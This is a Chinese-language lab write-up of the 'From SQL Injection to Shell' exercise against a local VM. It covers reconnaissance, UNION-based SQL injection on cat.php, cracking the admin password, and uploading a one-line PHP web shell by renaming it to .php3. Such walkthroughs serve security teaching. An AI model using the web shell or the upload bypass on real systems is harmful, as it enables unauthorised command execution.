## 从SQL注入到Shell

###  实验环境说明

- 目标服务器：下载镜像，VirtualBox加载

  ![18](image_sql_in\18.png)

- 攻击者主机（自用）：

  - Burp suite 代理监听所有端口
  - 能直接访问目标服务器![19](image_sql_in\19.png)

### 实验步骤记录

####  Fingerprinting: 采集信息

- HTTP 请求测试

  - telnet

    ![1](image_sql_in\1.png)

  - 浏览器访问 http://10.0.2.15  burp suite劫持

    ![2](image_sql_in\2.png)

  - 由此可以判断目标使用的网络服务器、以及php版本信息

- HTTPS 请求测试 

  - openssl :connect error

  ![20](image_sql_in\20.png)

  - nmap扫描：只有22 ，80 端口开着，所以HTTPS请求不支持

    ![21](image_sql_in\21.png)

- 获取文件目录

  - wfuzz：

    ![3](image_sql_in\3.png)

####  Detection and exploitation of SQL injection:检查并利用SQL注入漏洞

- 发现sql漏洞存在：

  请求 http://10.0.2.15/cat.php?id=3' 发现报错信息 提示语法错误，以及数据库应用为MYSQL

  ![4](image_sql_in\4.png)

- union测试

  通过反复测试，可以知道select语句选择的列有四列

  ![5](image_sql_in\5.png)

- 获取数据库信息

  - 表名，列名：

    - 通过更改显示参数的位置，可以判断出picture:应该取的是第2列的数据进行显示，所以应该将待显示数据，放在第2列的位置
    - 对比排除数据库的基本设置，得到用户自定义的数据库信息

    ![6](image_sql_in\6.png)

  - 版本当前信息

    ![7](image_sql_in\7.png)

  - 以及当前用户名、当前的数据库等各种信息  

    ![8](image_sql_in\8.png)

####  Access to the administration pages and code execution ：进入管理界面，代码执行

- 破解管理员密码

  - 根据上图中的用户名、密码信息，获取管理员密码

    ![10](image_sql_in\10.png)

    ![11](image_sql_in\11.png)

    搜索结果，破解结果都说明管理员密码是P4ssw0rd

- 登录到管理界面

  - 管理界面地址： 根据目录破解的结果 尝试http://10.0.2.15/admin 就会自动跳转到管理界面

    ![22](image_sql_in\22.png)

  - 登录成功，密码正确

- 植入webshell

  - 根据上图中，可以发现管理界面有上传文件功能

  - 创建木马文件

    ```php 
    <?php
      system($_GET['cmd']);
    ?>
    ```

    这段代码的意思是将GET的参数中cmd的内容作为命令执行

  - 上传文件

    ![13](image_sql_in\13.png)

  - 第一次上传shell.php后，提示no php，禁止上传php。尝试将后缀更改为php3，上传成功。说明文件类型的检查是基于后缀名的。

- 利用webshell

  - 访问上传成功的php文件

  - URL可以通过访问http://10.0.2.15/cat.php 然后审查元素获得

    ![14](image_sql_in\14.png)

  - 访问URL，并且传递参数，获得返回

    ![16](image_sql_in\16.png)

  - 获得命令执行权限，攻击结束。